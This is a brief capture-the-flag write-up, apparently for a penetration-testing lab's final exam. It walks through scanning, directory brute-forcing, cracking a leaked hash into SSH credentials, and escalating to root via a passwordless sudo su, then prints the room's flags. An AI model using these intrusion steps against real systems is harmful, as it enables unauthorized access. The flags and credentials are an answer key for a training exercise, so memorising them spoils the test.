# Final Exam CC PenTesting

```
export ip=10.10.28.72
```

## **Nmap** response in **nmap/initial**

## **Nikto** response in **nikto/initial**

## **Gobuster** response in **gobuster/initial** - _/secret/_

### Gobuster search on _secret_ with `-x txt` flag => **secret.txt**

**$ip/secret/secret.txt** showed a hash `nyan:046385855FC9580393853D8E81F240B66FE9A7B8` which was decoded with _john_.

It resulted in credentials for an ssh connection `nyan:nyan`

## Privelage escalation

```
> sudo -l
Matching Defaults entries for nyan on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nyan may run the following commands on ubuntu:
    (root) NOPASSWD: /bin/su
```
So I ran

```
sudo su
```
And then I am root.

## What is the user.txt?

```
supernootnoot
```

## What is the root.txt?

```
congratulations!!!!
```

